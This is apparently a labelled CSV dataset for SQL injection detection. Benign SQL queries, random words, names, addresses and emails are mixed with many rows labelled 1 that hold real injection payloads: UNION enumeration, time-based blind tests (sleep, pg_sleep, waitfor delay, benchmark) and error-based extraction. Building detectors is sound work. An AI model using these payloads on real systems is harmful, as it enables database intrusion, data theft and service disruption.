Query,Label
equiparable,0
SELECT * FROM surface WHERE trap = 'iron',0
SELECT move FROM compound UNION ALL SELECT badly FROM dawn ORDER BY frog,0
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xdce'  =  'xdce",1
onzonilla,0
SELECT Count ( * )  AS shelf,0
SELECT AVG ( solution ) FROM spell SELECT SUM ( addition ) ,0
"1%""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""%""  =  """,1
"1   )    )    as berd where 5803  =  5803 union all select null,null,null,null,null,null,null--",1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1
-7246'||  (  select 'qchp' from dual where 8317  =  8317 order by 1--,1
SELECT in ( s )  FROM missing SELECT deer FROM written,0
SELECT * FROM dust FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wherever,0
" SELECT column_name ( s )  FROM simple,discuss",0
"1""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-5840'  )   or elt  (  1032  =  1032,3623  )  ",1
2u27lad9r4,0
1'+  (  select 'jaok' where 2592  =  2592,1
beckwith,0
SELECT forgotten ( s )  FROM better FULL OUTER JOIN,0
SELECT * FROM function  WHERE object = end,0
llobet garrido,0
"-2378"" where 2686  =  2686 or 6872  =  6872--",1
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   5171  =  5171,1
"SELECT SECOND ( ""2017-06-20 09:34:00.000023"" ) ;",0
"   SELECT COUNT ( them ) , solid FROM card BY author",0
SELECT two ( s )  FROM toward,0
17005940q,0
53087910t,0
"INSERT INTO aboard  ( smallest, large, somehow )  VALUES  ( 'ready', 'maybe', 'element' )  ",0
SELECT MIN ( scene )  AS situation FROM within,0
SELECT * FROM hour WHERE fact = 'studying',0
DELETE FROM satellites,0
SELECT COUNT ( DISTINCT visit )  FROM prove,0
SELECT * FROM eventually 3 SELECT * FROM fifth,0
SELECT AVG ( fifteen ) FROM sister SELECT SUM ( lack ) ,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE t.term_id  =  715",0
SELECT visitor FROM pass,0
SELECT start ( s )  FROM success UNION ALL,0
SELECT * FROM continent WHERE before IN  ( SELECT struck FROM name ) ,0
"  SELECT root AS hunt, long AS [birth]  FROM attention",0
celfa,0
SELECT TOP 50 PERCENT * FROM lot,0
"1"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT COUNT ( learn )  FROM truth,0
pettingill@demasiado.com.bv,0
DELETE FROM character WHERE passage = 'grandfather',0
calafell palmieri,0
"  SELECT Orders.smallrID, Employees.native, Employees.yourself FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.butID ORDER BY Orders.burstID",0
18517,0
SELECT * FROM feet WHERE hearing NOT LIKE '[ought]%',0
"calle de piquer, 8,",0
"-7323%"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,1
22115972t,0
99997973e,0
SELECT * FROM influence WHERE effort = 'copper'  AND  ( sun = 'until' OR brick = 'standard' ) ,0
SELECT * FROM grade  WHERE world = beginning,0
"1 where 4468  =  4468 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT affect ( s FROM cover RIGHT JOIN,0
6411,0
SELECT * FROM subject WHERE NOT pot = 'shape'  AND NOT receive = 'lake',0
1   )    )    and 9198  =  9198--,1
"-4286%""   )    )     )   union all select 2229,2229,2229,2229,2229,2229#",1
"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",1
"   SELECT nest, leave+ ', ' + wool+ ' ' + coffee+ ', ' + top AS greater  FROM rod",0
"1'  )   where 8628  =  8628 union all select null,null,null--",1
"  SELECT pole,longer FROM putting WHERE goose = 'sweet' UNION SELECT improve, stomach FROM stems",0
SELECT * FROM chance,0
"1%""  )   union all select null,null#",1
"1%' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT * FROM advice,0
SELECT * FROM should WHERE thread IN  ( SELECT forty FROM have ) ,0
48483117z,0
SELECT * FROM blow ORDER BY cattle,0
SELECT * FROM to WHERE rise IN  ( SELECT difficulty FROM willing ) ,0
1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
av. bayona 127 1?c,0
"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,1
SELECT bill,0
SELECT * FROM brass WHERE straight = 'chemical'  AND City = 'recall',0
angeles jarama,0
"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
coch soto,0
"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1
"avinguda gabriel alomar i villalonga, 20 6?a",0
SELECT chamber,0
1'  )   where 6305  =  6305 rlike   (  select   (  case when   (  8326  =  9749  )   then 1 else 0x28 end   )    )   --,1
SELECT * FROM basket FETCH FIRST 50 PERCENT ROWS ONLY,0
rashmi,0
SELECT * FROM  ( SELECT highway FROM walk ) ,0
"-8136'  )   union all select 1324,1324,1324,1324#",1
SELECT * FROM poet 3 SELECT * FROM yourself,0
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1
-1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh,1
marcanti,0
SELECT AVG ( principal ) FROM house SELECT SUM ( feature ) ,0
"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"  SELECT * FROM private WHERE cast NOT IN  ( 'those', 'roar', 'crowd' )  ",0
masters-mcnear@costablancarental.ax,0
SELECT * FROM drop WHERE human = 'unknown' LIMIT 3,0
SELECT AVG ( Price ) FROM consist,0
SELECT where ( s )  FROM subject FULL OUTER JOIN,0
gumersindo,0
"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",1
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr",1
santiago de la puebla,0
SELECT TOP 3 * FROM afternoon SELECT * FROM bark 3SELECT * FROM light,0
ges,0
SELECT * FROM lucky WHERE stream = 'seems',0
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",1
SELECT * FROM else WHERE dish BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COUNT ( numeral ) FROM breeze,0
"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""rqxd""  =  ""rqxd",1
SELECT ever ( s )  FROM saved SELECT differ FROM present,0
1'   )    )     )   and 2542  =  7042--,1
SELECT noon ( s )  FROM wait SELECT cup FROM open,0
"1  )   as qodq where 4945  =  4945 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 289969 )  ORDER BY meta_id ASC",0
haslund@arvigar.sl,0
SELECT scientist ( s )  FROM shop SELECT author ( s ) ,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347696 )  ORDER BY meta_id ASC",0
SELECT * FROM queen WHERE riding BETWEEN 'yet' AND 'excitement',0
31587,0
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""kszu""  =  ""kszu",1
8847,0
SELECT government FROM dull UNION SELECT colony FROM fourth ORDER BY personal,0
"INSERT INTO something  ( figure, sail, mad )  VALUES  ( 'announced', 'example', 'very' )  ",0
SELECT TOP 3 * FROM hay WHERE religious = 'battle' SELECT * FROM slip,0
"INSERT INTO beyond ( score, percent, wide, late, breathing, gravity )  VALUES  ( 'stop', 'layers'. powder', 'anyway', 'skin', 'example', 'follow' )  ",0
SELECT TOP 3 * FROM ran,0
SELECT * FROM effort WHERE scared = 'these',0
"  SELECT Orders.salerID, Employees.football, Employees.grew FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.familiarID ORDER BY Orders.constantlyID",0
"1%' union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT laugh ( s )  FROM earth,0
SELECT gone FROM simplest UNION ALL SELECT store FROM walk ORDER BY evening,0
"granados 151,",0
cuellar reino,0
1'  )   and   (  3020  =  3020  )  *6703 and   (  'lhfa'  =  'lhfa,1
SELECT * FROM complex WHERE Price NOT BETWEEN 10 AND 20,0
brana,0
kovacs,0
fariba,0
SELECT table ( s ) FROM minute INNER JOIN,0
SELECT TOP 3 * FROM airplane SELECT * FROM natural 3SELECT * FROM doing,0
antirreglamentaria,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  """,1
"select * from generate_series  (  4592,4592,case when   (  4592  =  4592  )   then 1 else 0 end  )   limit 1--",1
"-4746%""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'cpfn' like 'cpfn",1
" SELECT * FROM force ORDER BY powerful, art",0
"1'+  (  select 'zohk' where 5502  =  5502 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
 UPDATE prevent SET chicken = 'disease'WHERE practice = 'soft',0
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'javh'  =  'javh",1
1.93755E+15,0
"-1148""   )    )    union all select 5442,5442,5442,5442#",1
"1   )    )    as tbiq where 7159  =  7159 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,1
92793320g,0
SELECT shout ( s )  FROM standard SELECT toward FROM habit,0
"   SELECT brave,package,these,raw,result     (  (  large JOIN also ON way.collect =  wall.difficult )   INNER JOIN proudON Orders.farm =  pipe.certainlyID ) ",0
brbara,0
SELECT * FROM clay WHERE    NOT consist = 'cowboy',0
"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
SELECT * FROM physical WHERE hearing = 'shirt'  OR opinion = 'breath',0
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",1
44,0
3.4008E+15,0
SELECT COUNT ( method )  FROM fort,0
"1  )   union all select null,null#",1
smoot,0
SELECT * FROM wing WHERE weigh BETWEEN 'bit' AND 'while',0
SELECT * FROM bush FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM cookies,0
SELECT just,0
"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",1
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",1
espelt bone,0
"1 where 3478  =  3478   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
"  SELECT WEEKDAY ( ""2017-06-15"" ) ;",0
SELECT electric ( s )  FROM equally UNION,0
SELECT sugar ( s FROM opportunity RIGHT JOIN,0
SELECT AVG ( either ) FROM result SELECT SUM ( slipped ) ,0
"INSERT INTO eye  ( above, article, printed )  VALUES  ( 'plain', 'own', 'selection' )  ",0
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1
"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT AVG ( mighty ) FROM company,0
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""buwe""  =  ""buwe",1
SELECT * FROM afraid WHERE rays = 'roar',0
"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",1
"1   )    )     )   union all select null,null,null,null,null,null,null--",1
"1 where 5925  =  5925 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
lopez castrillon 162,0
"-9566%""  )   union all select 7973,7973,7973,7973--",1
SELECT hot ( s )  FROM distant SELECT rose FROM area,0
SELECT growth ( s )  FROM market,0
50420,0
1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,1
mortandad,0
28760,0
1'  )   as sruz where 6318  =  6318,1
SELECT AVG ( locate )  FROM pilot  SELECT SUM ( practice ) ,0
SELECT * FROM station WHERE stranger = 'afraid' LIMIT 3,0
spain@erasmusrooms.bi,0
"-8709"" or 8571  =  8571--",1
select   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,1
SELECT AVG ( oil ) FROM happen,0
SELECT * FROM birds 3,0
"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""uquh""  =  ""uquh",1
SELECT * FROM age,0
cutler.hutton@the-white-pearl-resort.int,0
SELECT compare ( s )  FROM must SELECT drive ( s ) ,0
oxendine,0
SELECT notice ( s )  FROM again SELECT group FROM however,0
52207398c,0
"1""   )    )    as uxnc where 8041  =  8041 and 9198  =  9198--",1
"1%""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,1
DELETE FROM hill WHERE aboard = 'opposite',0
"-3437  )   union all select 7774,7774,7774--",1
78739097t,0
SELECT sunlight,0
"""a"""" or 3  =  3--""",1
1'||  (  select 'kptj' from dual where 5123  =  5123,1
cecil.wolcott7@librodeapuntes.sv,0
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",1
SELECT COUNT ( somebodyID ) FROM broken,0
10665,0
"  SELECT SUBDATE ( ""2017-06-15"", INTERVAL 10 DAY ) ;",0
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
42010181z,0
97963158v,0
"INSERT INTO brown ( sun, pleasant, society, planet, back, behavior )  VALUES  ( 'trick', 'stared'. level', 'certainly', 'hair', 'fair', 'certainly' )  ",0
desortija0a,0
"1""  )   where 1807  =  1807",1
86943454g,0
24324,0
SELECT * FROM kill FETCH FIRST 3 ROWS ONLY,0
-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,1
"1  )   as qjjm where 3850  =  3850 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
moriyama,0
5.95639E+15,0
SELECT * FROM chest WHERE knew BETWEEN '1996-07-01' AND '1996-07-31',0
"   SELECT Employees.white, COUNT ( Orders.beforeID )  AS lakeFROM    ( OrdersINNER JOIN herd ON Orders.whistleID  =  Employees.climbID ) ",0
SELECT paper FROM corn,0
8708,0
41100,0
SELECT COUNT ( spoken )  FROM explanation,0
"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld",1
basta@24htranslations.edu,0
"-6772""   )    )    or 9323  =  9323#",1
fantaseadora,0
"1'   )    )    union all select null,null,null,null,null,null,null#",1
gldar,0
25300,0
" SELECT * FROM doctor ORDER BY public ASC, mirror DESC",0
SELECT * FROM action WHERE catch = 'public',0
"1%""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
